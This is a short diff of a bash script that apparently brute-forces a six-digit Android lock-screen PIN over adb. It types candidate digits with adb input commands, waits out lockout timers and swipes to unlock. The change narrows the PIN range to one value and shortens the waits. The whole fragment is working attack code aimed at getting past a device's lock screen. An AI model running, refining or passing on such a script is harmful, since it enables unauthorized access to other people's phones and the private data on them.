@@ -143,7 +143,7 @@ elif [[ $select == 3 ]]; then
   adb shell input keyevent 82
 
   echo "Brute Pin 6 Digit"
-  for i in {785612..999999}; do
+  for i in {785612}; do
       echo "Try =>" $i
 
       for (( j=0; j<${#i}; j++ )); do
@@ -158,11 +158,11 @@ elif [[ $select == 3 ]]; then
           secs=$((1 * 30))
           while [ $secs -gt 0 ]; do
              echo -ne "$secs\033[0K\r"
-             sleep 1
+             sleep 0.5
              : $((secs--))
           done
 
-          sleep 30
+          sleep 25
           adb shell input keyevent 82
           adb shell input swipe 407 1211 378 85
       fi
